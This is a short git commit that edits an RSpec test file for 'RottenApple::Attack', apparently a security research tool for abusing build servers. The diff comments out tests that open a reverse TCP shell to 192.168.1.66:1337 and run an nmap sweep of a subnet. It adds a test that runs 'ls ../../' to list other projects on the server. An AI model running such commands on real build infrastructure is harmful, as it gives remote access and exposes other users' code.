37f208a16beb9fbf923fcf3d8fca01f2ec739fea
Jonathan Claudius <claudijd@yahoo.com>
2013-02-12 22:13:06 -0600

    Testing project testing

--- spec/rotten_apple_spec.rb
+++ spec/rotten_apple_spec.rb
@@ -10,17 +10,17 @@ describe RottenApple::Attack do
     subject{@attack}
     its(:class) {should == RottenApple::Attack}
     
-    it "should throw a reverse tcp shell" do
-      subject.reverse_shell('192.168.1.66', 1337)
+    #it "should throw a reverse tcp shell" do
+    #  subject.reverse_shell('192.168.1.66', 1337)
+    #end
+
+    #it "should perform an NMAP scan" do
+    #  subject.command('nmap -p 80,443 --open -Pn -P0 -n -T4 192.168.1.0/24')
+    #end
+
+    it "should list the other projects built on this server" do
+      subject.command('ls ../../')
     end
-
-    #it "should perform an NMAP scan" do
-    #  subject.command('nmap -p 80,443 --open -Pn -P0 -n -T4 192.168.1.0/24')
-    #end
-
-    #it "should perform an NMAP scan" do
-    #  subject.command('nmap -p 80,443 --open -Pn -P0 -n -T4 192.168.1.0/24')
-    #end
   end
 
 end
